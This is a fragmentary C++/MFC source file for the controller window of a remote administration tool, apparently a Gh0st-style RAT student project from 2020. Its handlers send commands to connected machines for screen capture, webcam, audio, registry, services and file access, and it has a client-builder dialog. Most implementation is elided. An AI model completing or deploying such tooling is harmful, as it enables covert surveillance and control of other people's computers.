...
// CMyRemoteToolDlg 对话框
CMyRemoteDlg::CMyRemoteDlg(CWnd* pParent): CDialogEx(CMyRemoteDlg::IDD, pParent)
{
...
BEGIN_MESSAGE_MAP(CMyRemoteDlg, CDialogEx)
	...
	ON_COMMAND(ID_ONLINE_MESSAGE, &CMyRemoteDlg::OnOnlineMessage)
	ON_COMMAND(ID_ONLINE_DELETE, &CMyRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_ONLINE_ABOUT,&CMyRemoteDlg::OnAbout)

	ON_COMMAND(IDM_ONLINE_CMD, &CMyRemoteDlg::OnOnlineCmdManager)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMyRemoteDlg::OnOnlineProcessManager)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMyRemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMyRemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CMyRemoteDlg::OnOnlineFileManager)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMyRemoteDlg::OnOnlineAudioManager)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMyRemoteDlg::OnOnlineVideoManager)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMyRemoteDlg::OnOnlineServerManager)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CMyRemoteDlg::OnOnlineRegisterManager)  
	ON_COMMAND(IDM_ONLINE_BUILD, &CMyRemoteDlg::OnOnlineBuildClient)    //生成Client
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_COMMAND(IDM_NOTIFY_SHOW, &CMyRemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_NOTIFY_EXIT, &CMyRemoteDlg::OnNotifyExit)
	ON_COMMAND(ID_MAIN_SET, &CMyRemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CMyRemoteDlg::OnMainExit)
...
VOID CMyRemoteDlg::CreateSolidMenu()
{
...
VOID CMyRemoteDlg::CreatStatusBar()
{
...
VOID CMyRemoteDlg::CreateNotifyBar()
{
#if INDEPENDENT
...
VOID CMyRemoteDlg::CreateToolBar()
{
...
VOID CMyRemoteDlg::TestOnline()
{
	ShowMessage(true,"软件初始化成功...");
}


VOID CMyRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
							   CString strCPU, CString strVideo, CString strPing,CONTEXT_OBJECT* ContextObject)
{
	...
	ShowMessage(true,strIP+" is Online");
	LeaveCriticalSection(&m_cs);
}


VOID CMyRemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
...
void CMyRemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
}
...
void CMyRemoteDlg::OnOnlineMessage()
{
...
VOID CMyRemoteDlg::OnOnlineCmdManager()
{
...
VOID CMyRemoteDlg::OnOnlineProcessManager()
{
	BYTE	bToken = COMMAND_SYSTEM;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}

VOID CMyRemoteDlg::OnOnlineWindowManager()
{
...
VOID CMyRemoteDlg::OnOnlineDesktopManager()
{	
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMyRemoteDlg::OnOnlineFileManager()
{
#if INDEPENDENT
...
VOID CMyRemoteDlg::OnOnlineAudioManager()
{
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMyRemoteDlg::OnOnlineVideoManager()
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMyRemoteDlg::OnOnlineServerManager()
{
	BYTE	bToken = COMMAND_SERVICES;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMyRemoteDlg::OnOnlineRegisterManager()
{
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

void CMyRemoteDlg::OnOnlineBuildClient()
{
	// TODO: 在此添加命令处理程序代码
	CBuildDlg Dlg;
	Dlg.m_strIP = ((CMyRemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
	CString Port;
	Port.Format("%d", ((CMyRemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost"));
	Dlg.m_strPort = Port;
	Dlg.DoModal();
}


VOID CMyRemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while(Pos)
	{
...
//真彩Bar
VOID CMyRemoteDlg::OnAbout()
{
	MessageBox("Copyleft (c) SunXu Yunnan University Software 2020", "关于");
}

//托盘Menu
void CMyRemoteDlg::OnNotifyShow()
{
	ShowWindow(SW_SHOW);
}


void CMyRemoteDlg::OnNotifyExit()
{
...
VOID CMyRemoteDlg::Activate(int nPort,int nMaxConnection)
{
...
VOID CALLBACK CMyRemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	AUTO_TICK(20);
...
VOID CALLBACK CMyRemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
{
	...
	g_RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)dlg, (LPARAM)nSocket);

	ContextObject->v1 = 0;
}


VOID CMyRemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
{
...
LRESULT CMyRemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
...
LRESULT CMyRemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
{
	...
	for (int i = 0; i < n; ++i)
	{
		...
		if (cur == port)
		{
			...
			m_iCount--;
			ShowMessage(true, ip + " is Offline");
			break;
		}
	}
	LeaveCriticalSection(&m_cs);
...
LRESULT CMyRemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
...
LRESULT CMyRemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
...
LRESULT CMyRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
...
LRESULT CMyRemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
...
LRESULT CMyRemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
...
LRESULT CMyRemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
...
BOOL CMyRemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
{
	MessageBox("Copyleft (c) SunXu Yunnan University Software 2020", "关于");
	return TRUE;
}
...
BOOL CMyRemoteDlg::PreTranslateMessage(MSG* pMsg)
{
